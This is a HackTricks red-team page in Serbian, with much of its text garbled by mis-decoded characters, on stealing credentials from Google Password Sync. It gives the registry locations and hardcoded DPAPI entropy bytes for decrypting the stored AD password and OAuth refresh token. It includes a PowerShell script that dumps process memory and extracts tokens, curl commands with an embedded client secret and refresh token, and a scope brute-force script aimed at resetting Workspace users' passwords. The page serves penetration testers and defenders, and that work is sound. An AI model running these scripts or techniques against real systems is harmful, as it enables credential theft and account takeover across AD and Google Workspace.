# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Ovo je binarni fajl i servis koji Google nudi kako bi **odrÅ¾ao sinhronizovane lozinke korisnika izmeÄ‘u AD** i Workspace-a. Svaki put kada korisnik promeni svoju lozinku u AD-u, ona se postavlja na Google.

Instalira se u `C:\Program Files\Google\Password Sync` gde moÅ¾ete pronaÄ‡i binarni fajl `PasswordSync.exe` za konfiguraciju i `password_sync_service.exe` (servis koji Ä‡e nastaviti da radi).

### GPS - Configuration

Da biste konfigurisali ovaj binarni fajl (i servis), potrebno je **dati mu pristup Super Admin principalu u Workspace-u**:

* Prijavite se putem **OAuth** sa Google-om i onda Ä‡e **saÄuvati token u registru (kriptovan)**
* Dostupno samo na kontrolerima domena sa GUI
* Dati neke **akreditivĞµ Servisnog naloga iz GCP-a** (json fajl) sa dozvolama za **upravljanje korisnicima Workspace-a**
* Veoma loÅ¡a ideja jer ti akreditivi nikada ne isteknu i mogu se zloupotrebiti
* Veoma loÅ¡a ideja dati SA pristup preko workspace-a jer bi SA mogao biti kompromitovan u GCP-u i moguÄ‡e je prebaciti se na Workspace
* Google to zahteva za kontrolisane domene bez GUI
* Ovi akreditivi se takoÄ‘e Äuvaju u registru

Å to se tiÄe AD-a, moguÄ‡e je naznaÄiti da koristi trenutni **kontekst aplikacije, anonimno ili neke specifiÄne akreditive**. Ako je opcija akreditiva izabrana, **korisniÄko ime** se Äuva unutar fajla na **disku** i **lozinka** je **kriptovana** i Äuva se u **registru**.

### GPS - Dumping password and token from disk

{% hint style="success" %}
Napomena da [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) moÅ¾e da detektuje **GPS**, dobije informacije o konfiguraciji i **Äak dekriptuje lozinku i token**.
{% endhint %}

U fajlu **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** moguÄ‡e je pronaÄ‡i deo konfiguracije kao Å¡to je **`baseDN`** AD-a koji je konfigurisan i **`username`** Äiji se akreditivi koriste.

U registru **`HKLM\Software\Google\Google Apps Password Sync`** moguÄ‡e je pronaÄ‡i **kriptovani refresh token** i **kriptovanu lozinku** za AD korisnika (ako ih ima). Å taviÅ¡e, ako se umesto tokena koriste neki **SA akreditivi**, takoÄ‘e je moguÄ‡e pronaÄ‡i te kriptovane u toj adresi registra. **Vrednosti** unutar ovog registra su dostupne samo **Administratorima**.

Kriptovana **lozinka** (ako je ima) se nalazi unutar kljuÄa **`ADPassword`** i kriptovana je koristeÄ‡i **`CryptProtectData`** API. Da biste je dekriptovali, morate biti isti korisnik kao onaj koji je konfigurisao sinhronizaciju lozinki i koristiti ovu **entropiju** prilikom koriÅ¡Ä‡enja **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Kriptovani token (ako ga ima) se nalazi unutar kljuÄa **`AuthToken`** i kriptovan je koristeÄ‡i **`CryptProtectData`** API. Da biste ga dekriptovali, morate biti isti korisnik kao onaj koji je konfigurisao sinhronizaciju lozinki i koristiti ovu **entropiju** prilikom koriÅ¡Ä‡enja **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Å taviÅ¡e, takoÄ‘e je kodiran koristeÄ‡i base32hex sa reÄnikom **`0123456789abcdefghijklmnopqrstv`**.

Vrednosti entropije su pronaÄ‘ene koriÅ¡Ä‡enjem alata. Konfigurisano je da prati pozive ka **`CryptUnprotectData`** i **`CryptProtectData`** i zatim je alat koriÅ¡Ä‡en za pokretanje i praÄ‡enje `PasswordSync.exe` koji Ä‡e dekriptovati konfigurisanju lozinku i auth token na poÄetku, a alat Ä‡e **prikazati vrednosti za koriÅ¡Ä‡enu entropiju** u oba sluÄaja:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Napomena da je takoÄ‘e moguÄ‡e videti **dekriptovane** vrednosti u ulazu ili izlazu poziva ovih API-ja takoÄ‘e (u sluÄaju da u nekom trenutku Winpeas prestane da radi).

U sluÄaju da je Password Sync **konfigurisana sa SA akreditivima**, takoÄ‘e Ä‡e biti saÄuvana u kljuÄevima unutar registra **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - Dumping tokens from memory

BaÅ¡ kao i sa GCPW, moguÄ‡e je dump-ovati memoriju procesa `PasswordSync.exe` i `password_sync_service.exe` i moÄ‡i Ä‡ete da pronaÄ‘ete refresh i access tokene (ako su veÄ‡ generisani).\
Pretpostavljam da biste takoÄ‘e mogli pronaÄ‡i konfiguracione akreditive AD-a.

<details>

<summary>Dump <code>PasswordSync.exe</code> and the <code>password_sync_service.exe</code> processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generisanje pristupnih tokena iz osveÅ¾avajuÄ‡ih tokena

KoriÅ¡Ä‡enjem osveÅ¾avajuÄ‡eg tokena moguÄ‡e je generisati pristupne tokene koristeÄ‡i ga i ID klijenta i tajnu klijenta navedene u sledeÄ‡oj komandi:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Imajte na umu da Äak i ako imate refresh token, nije moguÄ‡e zatraÅ¾iti bilo koji scope za access token jer moÅ¾ete zatraÅ¾iti samo **scope-ove koje podrÅ¾ava aplikacija u kojoj generiÅ¡ete access token**.

TakoÄ‘e, refresh token nije vaÅ¾eÄ‡i u svakoj aplikaciji.
{% endhint %}

Podrazumevano, GPS neÄ‡e imati pristup kao korisnik svim moguÄ‡im OAuth scope-ovima, pa moÅ¾emo koristiti sledeÄ‡i skript da pronaÄ‘emo scope-ove koji se mogu koristiti sa `refresh_token` za generisanje `access_token`:

<details>

<summary>Bash skript za brute-force scope-ove</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

I ovo je izlaz koji sam dobio u vreme pisanja:
```
https://www.googleapis.com/auth/admin.directory.user
```
Koji je isti kao onaj koji dobijate ako ne navedete nikakav opseg.

{% hint style="danger" %}
Sa ovim opsegom moÅ¾ete **izmeniti lozinku postojeÄ‡eg korisnika kako biste eskalirali privilegije**.
{% endhint %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
